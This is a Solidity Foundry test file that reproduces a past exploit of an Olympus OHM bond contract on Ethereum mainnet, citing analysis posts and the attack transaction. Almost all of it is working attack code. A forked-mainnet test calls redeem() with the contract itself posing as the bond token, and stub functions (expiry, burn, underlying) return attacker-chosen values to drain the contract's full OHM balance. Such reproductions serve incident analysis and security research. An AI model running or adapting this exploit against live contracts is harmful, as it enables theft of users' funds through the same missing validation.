// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @Analysis
// https://twitter.com/0xPoor4ever/status/1583408336770170880
// https://twitter.com/peckshield/status/1583416829237526528
// https://twitter.com/Supremacy_CA/status/1583425026094641153
// TX
// https://etherscan.io/tx/0x3ed75df83d907412af874b7998d911fdf990704da87c2b1a8cf95ca5d21504cf

interface OHMBond {
    function redeem(address, uint) external;
}

contract ContractTest is DSTest{
    OHMBond OHMbond = OHMBond(0x007FE7c498A2Cf30971ad8f2cbC36bd14Ac51156);
    IERC20 OHM = IERC20(0x64aa3364F17a4D01c6f1751Fd97C2BD3D7e7f1D5);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 15794363); 
    }

    function testExploit() public{
        uint amount = OHM.balanceOf(address(OHMbond));
        OHMbond.redeem(address(this), amount);

        emit log_named_decimal_uint(
            "Attacker OHM balance after exploit",
            OHM.balanceOf(address(this)),
            9
        );
    }

    function expiry() external returns(uint48){
        return 1337;
    }
    function burn(address _who, uint256 _value) external {}
    function underlying() external returns(address) {
        return address(OHM);
    }


}
